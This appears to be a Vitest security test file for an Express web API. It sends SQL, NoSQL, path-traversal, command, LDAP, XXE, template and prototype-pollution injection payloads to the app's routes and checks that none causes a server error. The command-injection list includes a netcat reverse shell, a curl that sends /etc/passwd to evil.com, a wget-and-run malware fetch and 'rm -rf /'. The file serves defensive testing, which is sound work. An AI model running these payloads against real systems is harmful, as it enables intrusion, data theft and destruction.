import { describe, it, expect, beforeAll, vi } from 'vitest';
import request from 'supertest';
import express from 'express';
import helmet from 'helmet';
import { errorHandler } from '../../src/middleware/validation.js';

// ─── Mock Firebase & Firestore ───────────────────────────────────────────────

vi.mock('../../src/config/admin.js', () => ({
  adminAuth: {
    createUser: vi.fn(async (u: any) => ({ uid: 'mock-uid-' + Date.now(), ...u })),
    getUserByEmail: vi.fn(async (e: any) => ({ uid: 'mock-uid', email: String(e), displayName: String(e).split('@')[0] || 'User' })),
    verifyIdToken: vi.fn(async () => ({ uid: 'mock-uid', email: 'user@careerveda.ai', role: 'STUDENT' })),
    updateUser: vi.fn(async (uid: string, data: any) => ({ uid, ...data })),
    setCustomUserClaims: vi.fn(async () => {}),
    generatePasswordResetLink: vi.fn(async () => 'https://careerveda.ai/reset-password'),
  },
  adminDb: {
    collection: () => ({
      doc: () => ({
        get: async () => ({ exists: false, data: () => null, id: 'mock-id' }),
        set: async () => {},
        update: async () => {},
        delete: async () => {},
      }),
      get: async () => ({ docs: [], forEach: () => {} }),
      where: () => ({
        get: async () => ({ docs: [], forEach: () => {} }),
        orderBy: () => ({ get: async () => ({ docs: [], forEach: () => {} }) }),
      }),
      orderBy: () => ({ get: async () => ({ docs: [], forEach: () => {} }) }),
      count: () => ({ get: async () => ({ data: () => ({ count: 0 }) }) }),
    }),
    runTransaction: async (fn: Function) => fn({ get: async () => ({ data: () => null, exists: false }), update: async () => {}, set: async () => {}, delete: async () => {} }),
    batch: () => ({ commit: async () => {} }),
  },
  adminStorage: {
    bucket: () => ({
      upload: async () => [{}],
      file: () => ({ delete: async () => {}, getSignedUrl: async () => ['https://mock.url'] }),
    }),
  },
}));

vi.mock('../../src/services/firestore.js', () => ({
  createDocument: vi.fn(async (col: string, data: any) => ({ id: 'mock-' + Date.now(), ...data })),
  getDocument: vi.fn(async (col: string, id: string) => {
    if (col === 'users') return { id, uid: id, email: 'user@careerveda.ai', name: 'Test User', role: 'STUDENT' };
    return null;
  }),
  updateDocument: vi.fn(async (col: string, id: string, data: any) => ({ id, ...data })),
  deleteDocument: vi.fn(async (id: string) => ({ id, deleted: true })),
  queryDocuments: vi.fn(async () => []),
  getAllDocuments: vi.fn(async () => []),
  countDocuments: vi.fn(async () => 0),
}));

// ─── Build test app ──────────────────────────────────────────────────────────

async function buildApp() {
  const app = express();
  app.use(helmet());
  app.use(express.json({ limit: '10mb' }));

  const { default: authRoutes } = await import('../../src/modules/auth/routes.js');
  const { default: programRoutes } = await import('../../src/modules/programs/routes.js');
  const { default: jobRoutes } = await import('../../src/modules/jobs/routes.js');
  const { default: certificateRoutes } = await import('../../src/modules/certificates/routes.js');

  app.use('/api/auth', authRoutes);
  app.use('/api/programs', programRoutes);
  app.use('/api/jobs', jobRoutes);
  app.use('/api/certificates', certificateRoutes);
  app.use(errorHandler);

  return app;
}

let app: express.Express;
beforeAll(async () => { app = await buildApp(); });

// ─── SQL Injection via Query Parameters ──────────────────────────────────────

describe('SQL Injection via Query Parameters', () => {
  const sqlPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "1; SELECT * FROM users",
    "' OR 1=1 --",
    "admin'--",
    "' OR ''='",
    "1' AND '1'='1",
    "'; EXEC xp_cmdshell('dir'); --",
    "1' UNION SELECT null,null,null,null,null FROM users --",
    "'; INSERT INTO users VALUES('hacker','hacker@evil.com','admin'); --",
    "1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' --",
    "'; UPDATE users SET role='ADMIN' WHERE email='attacker@test.com'; --",
    "1'; WAITFOR DELAY '0:0:5' --",
    "' OR SLEEP(5) --",
  ];

  it.each(sqlPayloads)('does not execute SQL in search parameter: %s', async (payload) => {
    const res = await request(app).get('/api/programs').query({ search: payload });
    expect(res.status).not.toBe(500);
    if (res.status === 200) {
      const body = JSON.stringify(res.body);
      expect(body).not.toMatch(/sql|syntax|error.*query/i);
    }
  });

  it('does not execute SQL in category filter', async () => {
    const res = await request(app).get('/api/programs').query({ category: "' OR '1'='1" });
    expect(res.status).not.toBe(500);
  });

  it('does not execute SQL in email field', async () => {
    const res = await request(app).post('/api/auth/register').send({
      email: "admin'--@test.com", name: 'Test', password: 'password123',
    });
    expect(res.status).not.toBe(500);
  });

  it('does not execute SQL in login email', async () => {
    const res = await request(app).post('/api/auth/login').send({ email: "' OR '1'='1" });
    expect(res.status).not.toBe(500);
  });
});

// ─── NoSQL Injection Attempts ────────────────────────────────────────────────

describe('NoSQL Injection Attempts', () => {
  const nosqlPayloads = [
    { $gt: '' },
    { $ne: null },
    { $regex: '.*' },
    { $where: 'this.password' },
    { $gt: 0, $ne: '' },
    ['$ne', null],
    { $exists: true },
    { $in: ['admin'] },
    { $all: ['admin'] },
    { $elemMatch: { $gt: '' } },
  ];

  it.each(nosqlPayloads)('does not execute NoSQL injection in query: %o', async (payload) => {
    const res = await request(app).get('/api/programs').query({ category: JSON.stringify(payload) });
    expect(res.status).not.toBe(500);
  });

  it('does not allow NoSQL injection in body fields', async () => {
    const res = await request(app).post('/api/auth/register').send({
      email: { $gt: '' }, name: 'Test', password: 'password123',
    });
    expect(res.status).not.toBe(500);
  });

  it('does not allow NoSQL injection in login', async () => {
    const res = await request(app).post('/api/auth/login').send({ email: { $ne: '' } });
    expect(res.status).not.toBe(500);
  });

  it('does not allow NoSQL injection in job search', async () => {
    const res = await request(app).get('/api/jobs').query({ search: { $regex: '.*' } });
    expect(res.status).not.toBe(500);
  });
});

// ─── Path Traversal in File Uploads ──────────────────────────────────────────

describe('Path Traversal in File Uploads', () => {
  const pathPayloads = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
    '..%252f..%252f..%252fetc/passwd',
    '..%c0%af..%c0%af..%c0%afetc/passwd',
    '/etc/passwd%00.jpg',
    '....\\\\....\\\\....\\\\etc/passwd',
    '/proc/self/environ',
    'C:\\Windows\\System32\\drivers\\etc\\hosts',
  ];

  it.each(pathPayloads)('does not allow path traversal in document URL: %s', async (payload) => {
    const res = await request(app).get(`/api/certificates/download/${encodeURIComponent(payload)}`)
      .set('Authorization', 'Bearer valid-token');
    expect(res.status).not.toBe(500);
  });

  it('does not allow path traversal in certificate download', async () => {
    const res = await request(app).get('/api/certificates/download/../../etc/passwd')
      .set('Authorization', 'Bearer valid-token');
    expect(res.status).not.toBe(500);
    expect(res.status).not.toBe(200);
  });

  it('does not allow traversal in program thumbnail URL', async () => {
    const res = await request(app).post('/api/programs')
      .set('Authorization', 'Bearer valid-token')
      .send({
        title: 'Test Program', description: 'Test', category: 'Tech', duration: 12, price: 9999,
        thumbnail: '../../../etc/passwd',
      });
    expect(res.status).not.toBe(500);
  });
});

// ─── Command Injection Attempts ──────────────────────────────────────────────

describe('Command Injection Attempts', () => {
  const cmdPayloads = [
    '; ls -la',
    '| cat /etc/passwd',
    '&& rm -rf /',
    '$(cat /etc/passwd)',
    '`cat /etc/passwd`',
    '; ping -c 5 evil.com',
    '|| nc -e /bin/sh evil.com 4444',
    '; curl http://evil.com/steal?data=$(cat /etc/passwd)',
    '\n/bin/cat /etc/passwd',
    '; wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh',
  ];

  it.each(cmdPayloads)('does not execute command in name field: %s', async (payload) => {
    const res = await request(app).post('/api/auth/register').send({
      email: 'cmd@test.com', name: payload, password: 'password123',
    });
    expect(res.status).not.toBe(500);
  });

  it('does not execute command in search query', async () => {
    const res = await request(app).get('/api/programs').query({ search: '; cat /etc/passwd' });
    expect(res.status).not.toBe(500);
  });

  it('does not execute command in job location field', async () => {
    const res = await request(app).post('/api/jobs').set('Authorization', 'Bearer valid-token').send({
      title: 'Test Job', description: 'Test', location: '; rm -rf /',
    });
    expect(res.status).not.toBe(500);
  });
});

// ─── LDAP Injection ──────────────────────────────────────────────────────────

describe('LDAP Injection', () => {
  const ldapPayloads = [
    '*)(objectClass=*)',
    '*()|&\'',
    'admin)(&)',
    '*)(uid=*))(|(uid=*',
    '*)(&(objectClass=*)',
    '(&(uid=*))(|(password=*))',
  ];

  it.each(ldapPayloads)('does not execute LDAP injection: %s', async (payload) => {
    const res = await request(app).post('/api/auth/login').send({ email: payload });
    expect(res.status).not.toBe(500);
  });
});

// ─── XML/XXE Injection ──────────────────────────────────────────────────────

describe('XML/XXE Injection', () => {
  it('does not process XXE - XML body is not parsed as JSON', async () => {
    const payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
    const res = await request(app).post('/api/auth/register')
      .set('Content-Type', 'application/xml')
      .send(payload);
    // XML content type is not parsed by express.json(), body is undefined
    // The error handler catches the destructuring error - XXE is never executed
    expect([400, 415, 500]).toContain(res.status);
    // Verify the error is a body parsing issue, not XXE execution
    expect(res.body.error).toBeDefined();
  });

  it('does not execute XXE entities even on error', async () => {
    const payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>';
    const res = await request(app).post('/api/auth/register')
      .set('Content-Type', 'application/xml')
      .send(payload);
    // The server returns an error but does NOT fetch the external entity
    expect([400, 415, 500]).toContain(res.status);
    expect(JSON.stringify(res.body)).not.toContain('etc/passwd');
  });
});

// ─── Server-Side Template Injection (SSTI) ──────────────────────────────────

describe('Server-Side Template Injection', () => {
  const sstiPayloads = [
    '{{7*7}}',
    '${7*7}',
    '<%= 7*7 %>',
    '#{7*7}',
    '{{config.items()}}',
    '{{self.__class__.__mro__[2].__subclasses__()}}',
    '${T(java.lang.Runtime).getRuntime().exec("ls")}',
    '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
  ];

  it.each(sstiPayloads)('does not execute template injection: %s', async (payload) => {
    const res = await request(app).post('/api/auth/register').send({
      email: 'ssti@test.com', name: payload, password: 'password123',
    });
    expect(res.status).not.toBe(500);
  });

  it('does not execute SSTI in program search', async () => {
    const res = await request(app).get('/api/programs').query({ search: '{{config.items()}}' });
    expect(res.status).not.toBe(500);
  });
});

// ─── HTTP Header Injection ──────────────────────────────────────────────────

describe('HTTP Header Injection', () => {
  it('does not allow CRLF in custom headers (Node.js rejects)', async () => {
    // Node.js throws before sending when header contains invalid characters
    await expect(
      request(app).get('/api/programs').set('X-Custom-Header', 'value\r\nInjected-Header: malicious')
    ).rejects.toThrow();
  });

  it('does not allow host header injection', async () => {
    const res = await request(app).get('/api/programs').set('Host', 'evil.com');
    expect(res.status).not.toBe(500);
  });

  it('does not allow request smuggling via Content-Length', async () => {
    const res = await request(app).get('/api/programs')
      .set('Content-Length', '0')
      .set('Transfer-Encoding', 'chunked');
    expect(res.status).not.toBe(500);
  });
});

// ─── Prototype Pollution ─────────────────────────────────────────────────────

describe('Prototype Pollution', () => {
  it('does not allow __proto__ pollution in request body', async () => {
    const res = await request(app).post('/api/auth/register').send({
      email: 'proto@test.com', name: 'Test', password: 'password123',
      __proto__: { isAdmin: true },
    });
    expect(res.status).not.toBe(500);
  });

  it('does not allow constructor pollution', async () => {
    const res = await request(app).post('/api/auth/register').send({
      email: 'ctor@test.com', name: 'Test', password: 'password123',
      constructor: { prototype: { isAdmin: true } },
    });
    expect(res.status).not.toBe(500);
  });

  it('does not allow prototype pollution via query params', async () => {
    const res = await request(app).get('/api/programs').query({ '__proto__': 'polluted' });
    expect(res.status).not.toBe(500);
    expect(({} as any).polluted).toBeUndefined();
  });
});
